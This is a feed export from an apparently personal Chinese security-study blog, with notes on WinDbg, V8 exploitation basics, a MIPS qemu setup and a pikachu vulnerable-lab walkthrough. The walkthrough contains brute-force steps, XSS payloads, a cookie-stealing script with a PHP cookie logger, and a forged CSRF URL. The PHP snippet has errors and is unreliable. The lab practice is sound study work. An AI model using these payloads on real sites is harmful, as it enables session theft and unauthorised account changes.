//列出该进程更加的信息</li><li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li><li>.process EPROCESS　　//切入该进程中</li><li>!object 地址　　//显示该地址的对象信息。</li><li>bp address  //在地址address插入断点。</li><li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li><li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li><li>bd/be/bc</li><li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li><li>be 断点号 //此命令是开启断点号所对应的断点 。</li><li>bc *　　　//去除所有断点。</li><li>x   //x命令用来模糊查询</li><li>x nt!kes<em>des</em>table*   //样查看SSDT表的地址</li><li>dds 地址 //此命令用来解析某连续地址的函数名。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>工具学习</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>V8漏洞初学习</title>
    <link href="/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p><blockquote><p>v8编译后二进制名称叫d8.</p></blockquote><h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">browser/x64.release$ ./d8 --allow-natives-syntax<br><span class="hljs-symbol">V8</span> version <span class="hljs-number">7.5</span><span class="hljs-number">.0</span> (candidate)<br>d8&gt; var a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>undefined<br>d8&gt; <span class="hljs-comment">%DebugPrint(a);</span><br><span class="hljs-number">0x2ebcfb54dd41</span> &lt;<span class="hljs-symbol">JSArray</span>[<span class="hljs-number">3</span>]&gt;<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>d8&gt; <span class="hljs-comment">%SystemBreak();</span><br><span class="hljs-symbol">Trace</span>/breakpoint trap (core dumped)<br></code></pre></td></tr></tbody></table></figure><p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p><p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p><p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p><p><code>source /path/to/gdbinit_v8</code></p><p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haml">var a = [1,2,3];<br>var b = [1.1, 2.2, 3.3];<br>var c = [a, b];<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(a)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第一次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(b)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第二次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(c)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第三次调试<br></code></pre></td></tr></tbody></table></figure><p>gdb运行d8:</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/ctf/browser/x64</span>.release<span class="hljs-variable">$ </span>gdb ./d8<br>pwndbg&gt; set args --allow-natives-syntax ./test.js<br>pwndbg&gt; r<br><span class="hljs-title class_">Starting</span> <span class="hljs-symbol">program:</span> x64.release/d8 --allow-natives-syntax ./test.js<br>[<span class="hljs-title class_">Thread</span> debugging using libthread_db enabled]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87fde9700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18393</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87f5e8700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18394</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87ede7700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18395</span>)]<br><span class="hljs-number">0x12e891f8df11</span> &lt;<span class="hljs-title class_">JSArray</span>[<span class="hljs-number">3</span>]&gt;            <br></code></pre></td></tr></tbody></table></figure><p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p><p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p><p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p><p>telescope命令查看内存数据。</p><p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p><h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p><p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p><p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p><p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p><p>一个对象在内存中布局大致如下：</p><ul><li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li><li>prototype：prototype</li><li>elements:对象元素</li><li>length:元素个数</li><li>properties:属性</li></ul><p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p><p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p><p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p><blockquote><p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p></blockquote><h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html">https://www.codercto.com/a/81538.html</a></p><p>后续需要实践做一下这个ctf题目。</p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome_bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu下buildroot以及qemu环境搭建</title>
    <link href="/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p><h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo su<br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> binwalk<br>sudo spt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-built_in">get</span> install build-essential autoconf git //获取Git<br>git clone https://github.<span class="hljs-keyword">com</span>/devttys0/binwalk<br><span class="hljs-keyword">cd</span> binwalk<br>sudo <span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br>sudo ./deps.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></tbody></table></figure><h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p><p><code>sudo apt-get install libncurses5-dev patch</code></p><p>下载buildroot:</p><p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz </code></p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span>.tar.gz<br><span class="hljs-attribute">cd</span> buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">make</span> clean<br><span class="hljs-attribute">make</span> menuconfig<br></code></pre></td></tr></tbody></table></figure><p>出现配置界面：</p><ul><li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li><li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li><li>保存退出</li></ul><p><code>sudo make</code></p><p>静等完成。</p><p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p><p>测试：</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./mipsel-linux-gcc</span> hello.c -o hello<br><span class="hljs-string">./hello</span> <span class="hljs-string">//</span>失败<br></code></pre></td></tr></tbody></table></figure><p>使用file查看，是小端序的mips程序。</p><h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install qemu<br>sudo apt-<span class="hljs-built_in">get</span> install qemu-user-static<br></code></pre></td></tr></tbody></table></figure><p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p><p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/ld-uClibc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p><p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0'</code></p><p>解决方案：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/libc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p><p>运行成功。</p><p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p><h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu漏洞练习记录1</title>
    <link href="/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/"/>
    <url>/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p><p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p><p>查看源码，输入的验证码在本地验证：</p><p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p><p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p><h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote><p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p></blockquote><h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul><li>客户端使用用户名和密码请求登录</li><li>服务端收到请求去验证用户名和密码</li><li>验证成功后，服务端会签发一个token，再将token发送给客户端</li><li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li><li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li><li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li></ul><p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p><p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p><p>在测试器中，设置password和token两个变量，使用pitchfork。</p><p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p><p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p><p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p><p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p><p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p><p>开始攻击，根据不同length找出正确密码，爆破完成。</p><p>注：该方法着实鸡肋。</p><h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p><ul><li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li><li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li></ul><h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2><p>随意输入字符串，回显<b>who is xxx,i don’t care</b><br>f12查看，允许输入最大长度为20.</p><p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" alt="捕获.PNG"></p><p>更改一下可输入长度，输入一个简单的xss语句：<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>发现可以解析，即存在xss漏洞。</p><p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" alt="捕获.PNG"></p><p>观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。</p><p>如果是post型xss，无法直接使用url的方式进行攻击。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs #getcookie.php(把接收的cookie存到cookie.txt文件)">&lt;?php<br>$cookie=$_GET['cookie'];<br> #fp=$fopen("cookie.txt","a");<br>fwirte($fp,"Cookie:".$cookie."/n")<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><ul><li>构造一个xss攻击的js代码</li></ul><p><code>&lt;script&gt;window.open("http://127.0.0.1/getcookie.php?cookie="+document.cookie);&lt;/script&gt;</code></p><p>新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值……</p><p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" alt="捕获.PNG"></p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。</p><p>可以通过html页面方式提交，构造一个自己的post丢到自己的网站上</p><p>随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。</p><p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" alt="捕获.PNG"></p><blockquote><p>http中get和post的基本区别：<br>get方式在客户端通过url提交数据，数据在url中可以看到；<br>Post方式，数据放置在html header内提交，数据在url中看不到。<br>get只能传输比较少的数据，安全性较低，post传输数据较多。</p></blockquote><p>我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。<br>存储型xss又称永久型xss。</p><p>1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。</p><p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" alt="捕获.PNG"></p><p>2.注入<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。</p><p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" alt="1111.PNG"></p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。</p><h1 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h3 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h3><p>1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h3 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h3><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h3 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h3><ul><li>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造<ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul></li><li>2.确认凭证的有效期<ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul></li></ul><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://i.loli.net/2020/11/04/oTmNylSJxc9vVGa.png" alt="11.PNG"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可):</p><blockquote><p><a href="http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit">http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit</a></p></blockquote><p>诱使登录状态的用户点击url就可以完成CSRF攻击。</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。但不知为何时灵时不灵。</p><p>正常登录状态：</p><p><img src="https://i.loli.net/2020/11/04/b7PA2OHu319LGlB.png" alt="捕获.PNG"></p><p>点击恶意url后，用户信息直接被修改。</p><p><img src="https://i.loli.net/2020/11/04/ZBbA8GrJfQtFe6U.png" alt="捕获.PNG"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h2><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://i.loli.net/2020/11/04/4fFa5SkYcCtyZGj.png" alt="捕获.PNG"></p><h2 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h2><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIT学习</title>
    <link href="/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p><p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p><p>例子：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inc</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>{<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-number">1</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">inc</span>(<span class="hljs-number">3</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><code>objdump -d 1</code>查看它的机器码。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 